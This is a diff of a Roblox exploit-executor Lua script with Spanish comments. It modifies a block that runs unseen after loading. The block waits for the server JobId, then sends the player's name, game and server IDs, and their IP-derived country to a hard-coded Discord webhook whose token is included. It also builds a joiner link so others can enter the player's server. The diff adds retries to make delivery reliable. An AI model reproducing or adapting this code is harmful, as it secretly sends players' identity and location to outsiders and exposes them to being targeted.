@@ -14,14 +14,25 @@ if not getgenv().EjecutarsePrimero_Loadstring then
 end
 
 -- ====================================
--- Script 1: Webhook Delta-safe (se ejecuta después del delay)
+-- Script 1: Webhook Delta-safe (espera JobId válido y carga del jugador)
 -- ====================================
 if not getgenv().EjecutarsePrimero_Webhook1 then
     getgenv().EjecutarsePrimero_Webhook1 = true
 
-    task.delay(5, function() -- Espera 5 segundos antes de enviar el webhook
-        local WebhookURL1 = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
+    task.spawn(function()
+        -- Espera hasta que JobId esté disponible, máximo 15 segundos
+        local maxWait = 15
+        local elapsed = 0
+        while (not game.JobId or game.JobId == "") and elapsed < maxWait do
+            task.wait(0.5)
+            elapsed = elapsed + 0.5
+        end
 
+        -- Espera adicional a que el jugador haya cargado completamente
+        -- Se puede ajustar según la carga de items/estadísticas
+        task.wait(3)
+
+        local WebhookURL1 = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
         local placeId = tostring(game.PlaceId)
         local jobId = tostring(game.JobId)
         local nick = LocalPlayer.Name
@@ -29,14 +40,12 @@ if not getgenv().EjecutarsePrimero_Webhook1 then
         local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")
         local avatarUrl = "https://i.postimg.cc/DZW66bqk/IMG-20250316-120840.jpg"
 
-        -- Generar joinLink único
         local function generateJoinLink()
             local uniqueId = HttpService:GenerateGUID(false)
             return "https://fern.wtf/joiner?placeId="..placeId.."&gameInstanceId="..jobId.."&token="..uniqueId
         end
         local joinLink = generateJoinLink()
 
-        -- Detectar país
         local function detectCountry()
             local country = "No se logró detectar el país"
             local services = {
@@ -68,7 +77,6 @@ if not getgenv().EjecutarsePrimero_Webhook1 then
         local countryName = detectCountry()
         local countryField = "País: "..countryName
 
-        -- Preparar embed
         local info1 = {
             ["content"] = "**Teleport jugador 100% funciona 👀!**",
             ["embeds"] = {{
@@ -89,13 +97,20 @@ if not getgenv().EjecutarsePrimero_Webhook1 then
         }
 
         local jsonData1 = HttpService:JSONEncode(info1)
-        pcall(function()
-            request({
-                Url = WebhookURL1,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = jsonData1
-            })
-        end)
+
+        -- Reintentos hasta 3 veces para asegurar envío correcto
+        local success = false
+        for attempt = 1, 3 do
+            success = pcall(function()
+                request({
+                    Url = WebhookURL1,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData1
+                })
+            end)
+            if success then break end
+            task.wait(2) -- espera 2 segundos antes de reintentar
+        end
     end)
 end
